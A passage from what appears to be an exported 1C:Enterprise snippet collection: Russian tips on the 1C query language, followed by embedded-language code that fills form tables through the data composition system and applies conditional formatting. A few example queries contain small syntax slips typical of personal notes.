5) Не стоит забывать про инструкцию РАЗРЕШЕННЫЕ, которая означает, что запрос выберет только те записи, на которые у текущего пользователя есть права. Если данное слово не указать, то в случае, когда запрос выберет записи, на которые у пользователя нет прав, запрос отработает с ошибкой.

6) В случае, если в запросе используется объединение, и в некоторых частях объединения присутствуют вложенные таблицы (документ с табличной частью), а в некоторых нет, возникает необходимость дополнения списка выборки полями – пустыми вложенными таблицами. Делается это при помощи ключевого слова ПУСТАЯТАБЛИЦА, после которого в скобках указываются псевдонимы полей, из которых будет состоять вложенная таблица.

Пример:
// Выбрать поля Номер и Состав
// из виртуальной таблицы Документ.РасхНакл
ВЫБРАТЬ Ссылка.Номер, ПУСТАЯТАБЛИЦА.(Ном, Тов, Кол) КАК Состав
ИЗ Документ.РасхНакл
ОБЪЕДИНИТЬ ВСЕ
ВЫБРАТЬ Ссылка.Номер, Состав.(НомерСтроки, Товар, Количество)
ИЗ Документ.РасхНакл Документ.РасходнаяНакладная.Состав.*

7) Что бы в результат запроса не попали повторяющиеся строки, следует использовать инструкцию РАЗЛИЧНЫЕ, потому что так нагляднее и понятнее, а инструкция СГРУППИРОВАТЬ ПО применяется для группировки с помощью агрегатных функций. Ксати, при использовании агрегатных функций предложение СГРУППИРОВАТЬ ПО может быть и не указано совсем, при этом все результаты запроса будут сгруппированы в одну единственную строку.

Пример:
// Необходимо узнать, каким вообще контрагентам
// отгружался товар за период.
Выбрать Различные
Документ.РасходнаяНакладная.Контрагент

8) Инструкция СГРУППИРОВАТЬ ПО позволяет обращаться к полям верхнего уровня, без группировки результатов по этим полям, если агрегатные функции применены к полям вложенной таблицы. Хотя в справке 1С написано, при группировке результатов запроса в списке полей выборки обязательно должны быть указаны агрегатные функции, а помимо агрегатных функций в списке полей выборки допускается указывать только поля, по которым осуществляется группировка.

Пример:
ВЫБРАТЬ
ПоступлениеТоваровИУслуг.Товары.(СУММА(Количество),Номенклатура),
ПоступлениеТоваровИУслуг.Ссылка,
ПоступлениеТоваровИУслуг.Контрагент
ИЗ
Документ.ПоступлениеТоваровИУслуг КАК ПоступлениеТоваровИУслуг
СГРУППИРОВАТЬ ПО
ПоступлениеТоваровИУслуг.Товары.(Номенклатура)

9) Инструкция ЕСТЬNULL предназначена для замены значения NULL на другое значение, но не забываем, что второй параметр будет преобразован к типу первого в случае, если тип первого параметра является строкой или числом.

10) При обращении к главной таблице можно в условии обратиться к данным подчиненной таблицы. Такая возможность называется разыменование полей подчиненной таблицы.

Пример (поиск документов, содержащих в табличной части определенный товар):
ВЫБРАТЬ
Приходная.Ссылка
ИЗ
Документ.Приходная Где Приходная.Товары.Номенклатура = &Номенклатура.

Преимущество этого запроса перед запросом к подчиненной таблице Приходная.Товары в том, что если есть дубли в документах, результат запроса вернет только уникальные документы без использования ключевого слова РАЗЛИЧНЫЕ.

11) Интересный вариант оператора В - это проверка вхождения упорядоченного набора в множество таких наборов (Поле1, Поле2, ... , ПолеN) В (Поле1, Поле2, ... , ПолеN).

Пример:
ВЫБРАТЬ
Контрагенты.Ссылка
ГДЕ
(Контрагенты.Ссылка, Товары.Ссылка) В
(ВЫБРАТЬ Продажи.Покупатель, Продажи.Товар
ИЗ РегистрНакопления.Продажи КАК Продажи)
ИЗ
Справочник.Контрагенты,
Справочник.Товары

12) При любой возможности используйте виртуальные таблицы запросов. При создании запроса система предоставляет в качестве источников данных некоторое количество виртуальных таблиц - это таблицы, которые так же являются результатом запроса, который система формирует в момент выполнения соответствующего участка кода.

Разработчик может самостоятельно получить те же самые данные, которые система предоставляет ему в качестве виртуальных таблиц, однако алгоритм получения этих данных не будет оптимизирован, так как:
Все виртуальные таблицы параметризованы, т. е. разработчику предоставляется возможность задать некоторые параметры, которые система будет использовать при формировании запроса создания виртуальной таблицы. В зависимости от того, какие параметры виртуальной таблицы указаны разработчиком, система может формировать РАЗЛИЧНЫЕ запросы для получения одной и той же виртуальной таблицы, причем они будут оптимизированы с точки зрения переданных параметров.
Не всегда разработчик имеет возможность получить доступ к тем данным, к которым имеет доступ система.

13) В клиент-серверном варианте работы функция ПОДСТРОКА() реализуется при помощи функции SUBSTRING() соответствующего оператора SQL, передаваемого серверу баз данных SQL Server, который вычисляет тип результата функции SUBSTRING() по сложным правилам в зависимости от типа и значений ее параметров, а так же в зависимости от контекста, в котором она используется. В большинстве случаев эти правила не оказывают влияния на выполнение запроса, но бывают случаи, когда для выполнения запроса существенна максимальная длина строки результата, вычисленная SQL Server. Важно иметь в виду, что в некоторых контекстах использования функции ПОДСТРОКА() максимальная длина ее результата может оказаться равной максимальной длине строки ограниченной длины, которая в SQL Server равна 4000 символам. Это может привести к неожиданному аварийному завершению выполнения запроса:
Microsoft OLE DB Provider for SQL Server: Warning: The query processor could not produce a query plan from the optimizer because the total length of all the columns in the GROUP BY or ORDER BY clause exceeds 8000 bytes.
HRESULT=80040E14, SQLSTATE=42000, native=8618
Чтобы избежать такой ошибки, не рекомендуют использовать функцию ПОДСТРОКА() с целью приведения строк неограниченной длины к строкам ограниченной длины. Вместо нее лучше использовать операцию приведения типа ВЫРАЗИТЬ().

14) С осторожностью используйте ИЛИ в конструкции ГДЕ, так как использование условия с ИЛИ может значительно ""утяжелить"" запрос. Решить проблему можно конструкцией ОБЪЕДИНИТЬ ВСЕ.

Пример:
ВЫБРАТЬ
 _ДемоКонтрагенты.НаименованиеПолное
ИЗ
 Справочник._ДемоКонтрагенты КАК _ДемоКонтрагенты
ГДЕ
 _ДемоКонтрагенты.Ссылка = &Ссылка1

ОБЪЕДИНИТЬ ВСЕ

ВЫБРАТЬ
 _ДемоКонтрагенты.НаименованиеПолное
ИЗ
 Справочник._ДемоКонтрагенты КАК _ДемоКонтрагенты
ГДЕ
 _ДемоКонтрагенты.Ссылка = &Ссылка2

15) Условие НЕ В в конструкции ГДЕ увеличивает время исполнения запроса, так как это своего рода НЕ (ИЛИ1 ИЛИ2 ... ИЛИn), поэтому для больших таблиц старайтесь использовать ЛЕВОЕ СОЕДИНЕНИЕ с условием ЕСТЬ NULL.

Пример:
ВЫБРАТЬ
 _ДемоКонтрагенты.Ссылка
ИЗ
 Справочник._ДемоКонтрагенты КАК _ДемоКонтрагенты
  ЛЕВОЕ СОЕДИНЕНИЕ Документ._ДемоЗаказПокупателя КАК _ДемоЗаказПокупателя
  ПО _ДемоКонтрагенты.Ссылка = _ДемоЗаказПокупателя.Контрагент
ГДЕ
 _ДемоЗаказПокупателя.Контрагент ЕСТЬ NULL

15) При использовании Временных таблиц нужно индексировать поля условий и соединений в этих таблицах, НО, при использовании индексов запрос может выполняться еще медленнее. Поэтому необходимо анализировать каждый запрос с применением индекса и без, замерять скорость выполнения запроса и принимать окончательное решение.
Если вы помещаете во временную таблицу данные, которые изначально индексированы по некоторым полям, то во временной таблице индекса по этим полям уже не будет.

16) Если вы не используете Менеджер временных таблиц, то явно удалять временную таблицу не требуется, она будет удалена после завершения выполнения пакетного запроса, иначе следует удалить временную таблицу одним из способов: командой УНИЧТОЖИТЬ в запросе, вызвать метод МенеджерВременныхТаблиц.Закрыть()."}
}
},
{13,
{"СКД",1,0,"",""},
{6,
{"СКД отбор для таблицы",1,0,"",""},
{1,
{"Рабочее",1,0,"",""},
{0,
{"СКД",0,0,"","Функция ПолучитьТЗКонрагенты(НастройкиКомпоновщика) Экспорт 
	ТЗКонрагенты = Новый ТаблицаЗначений;
	СхемаКомпоновкиДанныхКонсоли = ПолучитьМакет(""МакетСКД"");
	
	ИсполняемыеНастройки = НастройкиКомпоновщика;
	
	ПараметрСоздатьНаДату = ИсполняемыеНастройки.ПараметрыДанных.Элементы.Найти(""ТекущаяДата"");
	ПараметрСоздатьНаДату.Значение = СоздатьНаДату;
	ПараметрСоздатьНаДату.Использование = Истина;
	
	//ЭлементыОтбора = ИсполняемыеНастройки.Отбор.Элементы;
	//ЭлементОтбора = ЭлементыОтбора.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	//ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(""Контрагент"");   
	//ЭлементОтбора.ВидСравнения = ВидСравненияКомпоновкиДанных.ВСписке;
	//ЭлементОтбора.Использование = Истина;
	//ЭлементОтбора.ПравоеЗначение = Справочники.Контрагенты.НайтиПоКоду(""00-013011"");
	
	КомпоновщикМакета 		= Новый КомпоновщикМакетаКомпоновкиДанных;
	МакетКомпоновкиДанных 	= КомпоновщикМакета.Выполнить(СхемаКомпоновкиДанныхКонсоли, ИсполняемыеНастройки,,,Тип(""ГенераторМакетаКомпоновкиДанныхДляКоллекцииЗначений""));
	
	ПроцессорКомпоновкиДанных = Новый ПроцессорКомпоновкиДанных;
	ПроцессорВывода = Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВКоллекциюЗначений;
	ПроцессорКомпоновкиДанных.Инициализировать(МакетКомпоновкиДанных);
	ПроцессорВывода.УстановитьОбъект(ТЗКонрагенты);
	ПроцессорВывода.Вывести(ПроцессорКомпоновкиДанных);	
	
	Возврат ТЗКонрагенты;
КонецФункции //ПолучитьМакетКомпоновкиДанных()"}
}
},
{0,
{"При создании",0,0,"","//ПриСозданииНаСервере
ФормаОбъект		= РеквизитФормыВЗначение(""Объект"");
СхемаКД			= ФормаОбъект.ПолучитьМакет(""МакетСКД"");

ВременноеХранилищеСКД = ПоместитьВоВременноеХранилище(СхемаКД, УникальныйИдентификатор);

//КомпоновщикНастроекКД элемент на форме из реквизита типа КомпоновщикНастроекКомпоновкиДанных
// На форму перетащен ""Отбор"" из ""Настройки""
КомпоновщикНастроекКД.Инициализировать(Новый ИсточникДоступныхНастроекКомпоновкиДанных(ВременноеХранилищеСКД));
КомпоновщикНастроекКД.ЗагрузитьНастройки(СхемаКД.НастройкиПоУмолчанию);
"}
},
{0,
{"Для вывода",0,0,"","//&НаСервере
//Для вывода
ФормаОбъект		= РеквизитФормыВЗначение(""Объект"");
СхемаКД			= ФормаОбъект.ПолучитьМакет(""МакетСКД"");

НастройкиКД = КомпоновщикНастроекКД.Настройки;

КомпоновщикМакетаКД	= Новый КомпоновщикМакетаКомпоновкиДанных;
МакетКД		= КомпоновщикМакетаКД.Выполнить(СхемаКД, НастройкиКД,,,Тип(""ГенераторМакетаКомпоновкиДанныхДляКоллекцииЗначений""));

ПроцессорКД = Новый ПроцессорКомпоновкиДанных;
ПроцессорКД.Инициализировать(МакетКД);

ДеревоСкладТовар	= Новый ДеревоЗначений;
ПроцессорВывода	= Новый ПроцессорВыводаРезультатаКомпоновкиДанныхВКоллекциюЗначений;
ПроцессорВывода.УстановитьОбъект(ДеревоСкладТовар);
ПроцессорВывода.Вывести(ПроцессорКД);

ЗначениеВРеквизитФормы(ДеревоСкладТовар, ""ДеревоСкладыТовары"");
"}
},
{0,
{"Отбор СКД (много кода)",0,0,"","//+++====== Отбор СКД ================================================

// Формирует синоним переменной.
// Пример: на входе ""ИмяПеременнойАБВГ"", на выходе ""Имя переменной АБВГ""
//
// Параметры
// ИмяРеквизита - Строка. Имя переменной, имя колонки таблицы
//
// Возвращаемое значение:
// Строка - Представление переменной
//
Функция СформироватьСиноним(ИмяРеквизита)
	
	Перем Синоним, ъ, Символ, ПредСимвол, СледСимвол, Прописная, ПредПрописная, СледПрописная, ДлинаСтроки;
	
	Синоним = ВРег(Сред(ИмяРеквизита, 1, 1));
	ДлинаСтроки = СтрДлина(ИмяРеквизита);
	Для ъ=2 По ДлинаСтроки Цикл
		Символ = Сред(ИмяРеквизита, ъ, 1);
		ПредСимвол = Сред(ИмяРеквизита, ъ-1, 1);
		СледСимвол = Сред(ИмяРеквизита, ъ+1, 1);
		Прописная = Символ = ВРег(Символ);
		ПредПрописная = ПредСимвол = ВРег(ПредСимвол);
		СледПрописная = СледСимвол = ВРег(СледСимвол);
		
		// Варианты:
		Если НЕ ПредПрописная И Прописная Тогда
			Синоним = Синоним + "" "" + Символ;
		ИначеЕсли Прописная И НЕ СледПрописная Тогда
			Синоним = Синоним + "" "" + Символ;
		Иначе
			Синоним = Синоним + Символ;
		Конецесли;
	КонецЦикла;
	
	Возврат Синоним;
	
КонецФункции // СформироватьСиноним()

&НаСервере
Функция ПолучитьКлючНастроек()
	
	ЭтотОбъектМетаданные 	= ПолучитьМетаданныеОбработки();
	ИмяОбработки 			= ЭтотОбъектМетаданные.Имя;	
	
	КлючДляПользователя 	= Ложь;
	Если КлючДляПользователя Тогда
		ТекущийПользователь = ""."" + СтрЗаменить(ИмяПользователя(), "" "", """");
	Иначе
		ТекущийПользователь = """";
	КонецЕсли; 
	
	КлючНастроек 			= ""Обработка."" + ИмяОбработки + ТекущийПользователь;
	
	Возврат КлючНастроек;
	
КонецФункции

&НаСервере
Функция ОпределитьОтборНаСервере(пНастройкиКомпоновщика = Неопределено)
	
	пОбъект = РеквизитФормыВЗначение(""Объект""); 
	МакетСКД = пОбъект.ПолучитьМакет(""СхемаКомпоновкиДанных"");
	
	АдресВременногоХранилищаМакетаСКД = ПоместитьВоВременноеХранилище(МакетСКД, Новый УникальныйИдентификатор());
	
	ИсточникНастроек = Новый ИсточникДоступныхНастроекКомпоновкиДанных(АдресВременногоХранилищаМакетаСКД);
	КомпоновщикНастроекКомпоновкиДанных.Инициализировать(ИсточникНастроек);
	
	Если пНастройкиКомпоновщика = Неопределено Тогда
		КомпоновщикНастроекКомпоновкиДанных.ЗагрузитьНастройки(МакетСКД.НастройкиПоУмолчанию);
	Иначе
		КомпоновщикНастроекКомпоновкиДанных.ЗагрузитьНастройки(пНастройкиКомпоновщика);
	Конецесли;
	//ЗначениеВРеквизитФормы(КомпоновщикНастроекКомпоновкиДанных,""КомпоновщикНастроекКомпоновкиДанных"");
	//ЗначениеВРеквизитФормы(СправочникОбъект,""Объект"");
	
КонецФункции

&НаКлиенте
Процедура ЗаполнитьТаблицу(Команда)
	
	РегенерацияТаблицы();
	
	// Приминение условных оформлений
	ПерезаполнитьУФФормы();
	
	// Дополнительные программные условные оформления
	ПрименитьУсловноеОфомление(""Таблица.Флаг"", ВидСравненияКомпоновкиДанных.Равно, Истина, ""Таблица"", , , , Истина); // Выделение жирным строк с флагом
	
КонецПроцедуры

&НаКлиенте
Процедура РегенерацияТаблицы()
	
	СформироватьТаблицуИзСКД();
	
	ТаблицаПриИзменении(Неопределено);
	
КонецПроцедуры

&НаКлиенте
Процедура СформироватьТаблицуИзСКД()
	
	Если Таблица.Количество() > 0 Тогда
		Ответ = Вопрос(""Перед заполнением таблица будет очищена. Заполнить?"", РежимДиалогаВопрос.ДаНет, , КодВозвратаДиалога.Нет, ""Проверка заполнения табличной части"");
		Если Ответ = КодВозвратаДиалога.Нет Тогда
			Возврат;
		КонецЕсли;
	КонецЕсли;
	
	ЗаполнитьТаблицуНаСервере();
	//Элементы.ОбъектРезультатВыборкиДоговора.Свернуть(""Контрагент, СсылкаНаДоговор, ДатаДействияДоговора"");
	
КонецПроцедуры

&НаСервере
Процедура УстановитьЗаголовокКолонки(ИмяКолонки, ЗначениеЗаголовка)
	
	ЭлементНайти = Элементы.Найти(ИмяКолонки);
	Если ЭлементНайти = Неопределено Тогда
		Возврат;	
	КонецЕсли; 
	
	ЭлементНайти.Заголовок 				= ЗначениеЗаголовка;
	
	ПредставлениеКолонокТекущая 		= ПредставлениеКолонок.НайтиПоЗначению(ИмяКолонки);
	ПредставлениеКолонокТекущая.Представление = ЗначениеЗаголовка;
	
КонецПроцедуры // УстановитьВидимостьКолонки()

&НаСервере
Процедура УстановитьВидимостьКолонки(ИмяКолонки, ЗначениеВидимости)
	
	ЭлементНайти = Элементы.Найти(ИмяКолонки);
	Если ЭлементНайти = Неопределено Тогда
		Возврат;	
	КонецЕсли; 
	
	ЭлементНайти.Видимость 				= ЗначениеВидимости;
	
	ПредставлениеКолонокТекущая 		= ПредставлениеКолонок.НайтиПоЗначению(ИмяКолонки);
	ПредставлениеКолонокТекущая.Пометка = ЗначениеВидимости;
	
КонецПроцедуры // УстановитьВидимостьКолонки()
 
&НаСервере
Процедура ЗаполнитьТаблицуНаСервере()
	
	// Поля необходимые для вывода в таблицу результата на форме.
	СтруктураНастроек = ПолучитьПустуюСтруктуруНастроек();
	
	СтруктураНастроек.КомпоновщикНастроек            = КомпоновщикНастроекКомпоновкиДанных;
	СтруктураНастроек.ИмяМакетаСхемыКомпоновкиДанных = ПолучитьСхемуКомпоновкиДанных(Истина);
	
	Таблица.Очистить();
	ПредставлениеКолонок.Очистить();
	
	// ВыполнениеЗапроса
	ОбработкаОбъект = РеквизитФормыВЗначение(""Объект"");
	
	Запросы = ПодготовитьСтруктуруДанных(СтруктураНастроек, ОбработкаОбъект);
	
	Запрос = Запросы.ЗапросНабора1;
	// Установка параметров для запроса (параметры в СКД на соответствующей вкладке)
	//Запрос.УстановитьПараметр(""ДатаНачала"", ПериодФормы.ДатаНачала);
	//Запрос.УстановитьПараметр(""ДатаОкончания"", ПериодФормы.ДатаОкончания);
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		РезультатЗапросаТЗ = РезультатЗапроса.Выгрузить();
		РезультатЗапросаТЗКолонки = РезультатЗапросаТЗ.Колонки;
		
		Для каждого ИмяКолонки Из РезультатЗапросаТЗКолонки Цикл
			
			//Таблица.Колонки.Добавить(ИмяКолонки);
			ИмяКолонкиИмя 		= ИмяКолонки.Имя;
			ИмяКолонкиЗаголовок = ИмяКолонки.Заголовок; 
			ИмяКолонкиТипЗначения = ИмяКолонки.ТипЗначения;
			
			ПредставлениеКолонок.Добавить(ИмяКолонкиИмя, ИмяКолонкиЗаголовок, Истина); // Пометкой отмечаются видимые
			
			ДобавитьКолонкуНаСервере(ИмяКолонкиИмя, ИмяКолонкиТипЗначения, СформироватьСиноним(ИмяКолонкиЗаголовок), ""Таблица"", Элементы.Таблица);
			
		КонецЦикла;
		
		Таблица.Загрузить(РезультатЗапросаТЗ);
	КонецЕсли; 
	
	// Если нужно снять видимость, то делать это через: УстановитьВидимостьКолонки(ИмяКолонки, ЗначениеВидимости)
	ТаблицаСсылкаИмя = ""Ссылка"";
	УстановитьВидимостьКолонки(ТаблицаСсылкаИмя, Истина);
	
	// Установка видимости для служебных колонок (для отбора или условного оформления)
	//НазваниеКолонки = ""НазваниеКолонки"";
	//Если Элементы.Найти(НазваниеКолонки) <> Неопределено Тогда // Т.к. могло вернуться 0 элементов
	//	Элементы[НазваниеКолонки].Видимость = Ложь;  	
	//КонецЕсли;
	
	// Выполнение запроса для другого набора данных
	//Запрос = Запросы.ЗапросНабора2;
	//РезультатЗапроса = Запрос.Выполнить();
	//
	//Если НЕ РезультатЗапроса.Пустой() Тогда
	//	РезультатЗапросаТЗ = РезультатЗапроса.Выгрузить();
	//	Таблица.Загрузить(РезультатЗапросаТЗ);
	//КонецЕсли;
	
	Элементы.ПредставлениеКолонок.Видимость = УстановитьВидимостьНастройкиПредставления();
	
	Если Таблица.Количество() = 0 Тогда
		Сообщить(""Не найдено элементов!"");
	КонецЕсли; 
	
КонецПроцедуры // ЗаполнитьТаблицуТоваровНаСервере()

//Процедура программно добавит колонку в таблицу
//-------------------------------------------------------------------------
//Параметры:
//		ИмяКолонки - Строка - вида ""Тест3""
//		ОписаниеТипов - ОписаниеТипов - напр., ""Строка""
//		Заголовок - Строка - напр., ""Пример""
//		Реквизит - Строка - Путь к реквизиту, напр ""Таблица"" или ""Объект.Таблица""
//		ЭлементыРеквизит - ТаблицаФормы - Путь к элементу на форме
//-------------------------------------------------------------------------
//автор: Кучеров Р 28.05.2018 
&НаСервере
Процедура ДобавитьКолонкуНаСервере(ИмяКолонки, ОписаниеТипов, Заголовок, Реквизит, ЭлементыРеквизит)
	
	Если Элементы.Найти(ИмяКолонки) = Неопределено Тогда
		нРеквизиты = Новый Массив;
		нРеквизиты.Добавить(Новый РеквизитФормы(ИмяКолонки, Новый ОписаниеТипов(ОписаниеТипов), Реквизит, Заголовок, Истина));
		ИзменитьРеквизиты(нРеквизиты);
		
		нЭлемент = Элементы.Добавить(ИмяКолонки, Тип(""ПолеФормы""), ЭлементыРеквизит);
		нЭлемент.Вид = ВидПоляФормы.ПолеВвода;
		нЭлемент.ПутьКДанным = Реквизит + ""."" + ИмяКолонки;
	КонецЕсли; 
	
КонецПроцедуры

//Процедура ПрименитьУсловноеОфомление 
//-------------------------------------------------------------------------
//Параметры:
//		ИмяПроверяемогоЭлемента - Строка - Напр., ""Объект.Имя_Проверяемого_Элемента""
//		ВидСравненияКД - Строка - ВидСравненияКомпоновкиДанных., напр ВидСравненияКомпоновкиДанных.Равно
//		ПравоеЗначениеОтбора - ЛюбойТип - Ннапр., Истина
//		ИмяОформляемогоЭлемента - Строка - Напр., ""Имя_Оформляемого_Элемента""
//		ИдентификаторПользовательскойНастройки - Строка - Напр., ""ИдентификаторПользовательскойНастройки"" (ИПН)
//														если заданный ИПН не найден, будет добавлен слемент с этим ИПН
//		ЦветТекста - WebЦвета - Напр., WebЦвета.Черный
//		ЦветФона - WebЦвета - Напр., WebЦвета.Лосоль
//		ЖирныйШрифт - Булево - Напр., Истина
//-------------------------------------------------------------------------
//автор: КучеровРМ 30.07.2018
&НаСервере
Процедура ПрименитьУсловноеОфомление(ИмяПроверяемогоЭлемента, ВидСравненияКД, ПравоеЗначениеОтбора, ИмяОформляемогоЭлемента, ИдентификаторПользовательскойНастройки = """", ЦветТекста = Неопределено, ЦветФона = Неопределено, ЖирныйШрифт = Ложь)
	
	УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
	
	Если ПустаяСтрока(ИдентификаторПользовательскойНастройки) Тогда
		ПрисвоитьИдентификаторПользовательскойНастройки = ИмяПроверяемогоЭлемента + ""_"" + ИмяОформляемогоЭлемента;
	КонецЕсли;
	
	ЕстьЭлементСИПН = Ложь;
	
	Для каждого ЭлементУО Из УсловноеОформлениеЭлементы Цикл
		
		Если ЭлементУО.ИдентификаторПользовательскойНастройки = ПрисвоитьИдентификаторПользовательскойНастройки Тогда
			ЕстьЭлементСИПН = Истина;
		КонецЕсли; 
		
	КонецЦикла;
	
	Если НЕ ЕстьЭлементСИПН Тогда // Добавляем новое условное офомление
		//УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
		ЭлементОформления = УсловноеОформлениеЭлементы.Добавить();
		
		ЭлементОформления.ИдентификаторПользовательскойНастройки = ПрисвоитьИдентификаторПользовательскойНастройки;
		// Создаем условие отбора
		ЭлементОтбора = ЭлементОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
		ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПроверяемогоЭлемента); // ИмяПроверяемогоЭлемента = ""Объект.Имя_Проверяемого_Элемента""
		ЭлементОтбора.ВидСравнения = ВидСравненияКД; 
		//Значение для отбора
		ЭлементОтбора.ПравоеЗначение = ПравоеЗначениеОтбора;
		ЭлементОтбора.Использование = Истина;
		// Установка значения элемента УО
		Если ЦветТекста <> Неопределено Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветТекста"", ЦветТекста); // WebЦвета.Черный
		КонецЕсли; 
		Если ЦветФона <> Неопределено Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветФона"", ЦветФона); // Томатный, Лосоль
		КонецЕсли;
		Если ЖирныйШрифт Тогда
			ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""Шрифт"", Новый Шрифт(, 10, Истина,,,,,)); //Выделение жирным шрифтом
		КонецЕсли;
		
		// Создаем поля оформления
		ПолеОформления = ЭлементОформления.Поля.Элементы.Добавить();
		ПолеОформления.Поле = Новый ПолеКомпоновкиДанных(ИмяОформляемогоЭлемента); // ИмяОформляемогоЭлемента = ""Имя_Оформляемого_Элемента""
		ПолеОформления.Использование = Истина;
	КонецЕсли;
	
КонецПроцедуры

 
&НаСервере
Процедура ДобавитьУсловноеОфомление(УсловноеОформлениеЭлементы, ИмяПроверяемогоЭлемента, ИмяОформляемогоЭлемента, ИдентификаторПользовательскойНастройки = """")
	
	//УсловноеОформлениеЭлементы = УсловноеОформление.Элементы;
	ЭлементОформления = УсловноеОформлениеЭлементы.Добавить();
	
	ЭлементОформления.ИдентификаторПользовательскойНастройки = ИдентификаторПользовательскойНастройки;
	// Создаем условие отбора
	ЭлементОтбора = ЭлементОформления.Отбор.Элементы.Добавить(Тип(""ЭлементОтбораКомпоновкиДанных""));
	ЭлементОтбора.ЛевоеЗначение = Новый ПолеКомпоновкиДанных(ИмяПроверяемогоЭлемента); // ИмяПроверяемогоЭлемента = ""Объект.Имя_Проверяемого_Элемента""
	ЭлементОтбора.ВидСравнения = ВидСравненияКомпоновкиДанных.Равно; 
	//Значение для отбора
	ЭлементОтбора.ПравоеЗначение = Истина;
	ЭлементОтбора.Использование = Истина;
	// Установка значения элемента УО
	//ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветТекста"", WebЦвета.Черный);
	//ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""ЦветФона"", WebЦвета.Коралловый); // Томатный, Лосоль
	ЭлементОформления.Оформление.УстановитьЗначениеПараметра(""Шрифт"", Новый Шрифт(, 10, Истина,,,,,)); //Выделение жирным шрифтом
	// Создаем поля оформления
	ПолеОформления = ЭлементОформления.Поля.Элементы.Добавить();
	ПолеОформления.Поле = Новый ПолеКомпоновкиДанных(ИмяОформляемогоЭлемента); // ИмяОформляемогоЭлемента = ""Имя_Оформляемого_Элемента""
	ПолеОформления.Использование = Истина; 
	
КонецПроцедуры

//Возвращает схему компановки данных, полученную из макета или только имя макета (в зависсимости от параметра)
&НаСервере
Функция ПолучитьСхемуКомпоновкиДанных(ТолькоИмяВернуть = Ложь)
	
	СхемаКомпоновкиДанных 	= Неопределено;
	ОбработкаОбъект 		= РеквизитФормыВЗначение(""Объект"");
    
	СхемаКомпоновкиДанныхИмя = ""СхемаКомпоновкиДанных"";
	
	Возврат  ?(ТолькоИмяВернуть, СхемаКомпоновкиДанныхИмя, ОбработкаОбъект.ПолучитьМакет(СхемаКомпоновкиДанныхИмя));
 	
КонецФункции

&НаСервере
Функция ПолучитьПустуюСтруктуруРезультата() Экспорт
	
	Структура = Новый Структура;
	Структура.Вставить(""ЗапросНабора1"" , Неопределено);
	//Структура.Вставить(""ЗапросНабора2"", Новый Соответствие);
	
	Возврат Структура;
	
КонецФункции // ПолучитьПустуюСтруктуруРезультата()

&НаСервере
 Функция ПолучитьПустуюСтруктуруНастроек() Экспорт
	
	СтруктураНастроек = Новый Структура;
	СтруктураНастроек.Вставить(""ОбязательныеПоля""   , Новый Массив); //
	СтруктураНастроек.Вставить(""ПараметрыДанных""    , Новый Структура);
	СтруктураНастроек.Вставить(""КомпоновщикНастроек"", Неопределено); // Отбор
	СтруктураНастроек.Вставить(""ИмяМакетаСхемыКомпоновкиДанных"" , Неопределено);
	
	Возврат СтруктураНастроек;
	
КонецФункции

&НаСервере
//Функция Функция подготавливает структуру данных, необходимую для вывода
//-------------------------------------------------------------------------
//Параметры:
//		СтруктураНастроек - Тип - описание
//		ОбработкаОбъект - Тип - описание
//Возвращаемое значение:
//		Стрруктура - описание
//-------------------------------------------------------------------------
//автор: Кучеров Р 28.05.2018 
Функция ПодготовитьСтруктуруДанных(СтруктураНастроек, ОбработкаОбъект) Экспорт
    
	СтруктураРезультата = ПолучитьПустуюСтруктуруРезультата();
	
	////////////////////////////////////////////////////////////////////////////////
	// ПОДГОТОВКА СХЕМЫ КОМПОНОВКИ ДАННЫХ И КОМПОНОВЩИКА НАСТРОЕК СКД
	
	// Схема компоновки.
	СхемаКомпоновкиДанных = ОбработкаОбъект.ПолучитьМакет(СтруктураНастроек.ИмяМакетаСхемыКомпоновкиДанных);

	// Подготовка компоновщика макета компоновки данных.
	Компоновщик 	= Новый КомпоновщикНастроекКомпоновкиДанных;
	НовыйИсточник 	= Новый ИсточникДоступныхНастроекКомпоновкиДанных(СхемаКомпоновкиДанных);
	Компоновщик.Инициализировать(НовыйИсточник);
	Компоновщик.ЗагрузитьНастройки(СхемаКомпоновкиДанных.НастройкиПоУмолчанию);
	
	//Копирование настроек с формы в компоновщик	
	Если СтруктураНастроек.КомпоновщикНастроек <> Неопределено Тогда
		СкопироватьЭлементы(Компоновщик.Настройки.Отбор, СтруктураНастроек.КомпоновщикНастроек.Настройки.Отбор);
		СкопироватьЭлементы(Компоновщик.Настройки.Выбор, СтруктураНастроек.КомпоновщикНастроек.Настройки.Выбор);
		СкопироватьЭлементы(Компоновщик.Настройки.Порядок, СтруктураНастроек.КомпоновщикНастроек.Настройки.Порядок);
		СкопироватьЭлементы(Компоновщик.Настройки.УсловноеОформление, СтруктураНастроек.КомпоновщикНастроек.Настройки.УсловноеОформление);
	КонецЕсли;
	
	// Параметры компоновщика настроек.
	//Если СтруктураНастроек.КомпоновщикНастроек <> Неопределено Тогда
	//	Для каждого Элемент  из Компоновщик.Настройки.ПараметрыДанных.Элементы Цикл
	//		ЗначениеПараметраИзСтруктурыНастроек = СтруктураНастроек.КомпоновщикНастроек.Настройки.ПараметрыДанных.НайтиЗначениеПараметра(Элемент.Параметр) ;
	//		Если Строка(ЗначениеПараметраИзСтруктурыНастроек.Параметр) = ""ВыводитьСерии"" Тогда
	//			ЗначениеПараметра = ЗначениеПараметраИзСтруктурыНастроек.Значение и ЗначениеПараметраИзСтруктурыНастроек.Использование;
	//			Компоновщик.Настройки.ПараметрыДанных.УстановитьЗначениеПараметра(Элемент.Параметр,ЗначениеПараметра);
	//		Иначе	
	//			Если ЗначениеПараметраИзСтруктурыНастроек.Использование Тогда
	//				Компоновщик.Настройки.ПараметрыДанных.УстановитьЗначениеПараметра(Элемент.Параметр,ЗначениеПараметраИзСтруктурыНастроек.Значение);
	//			КонецЕсли;
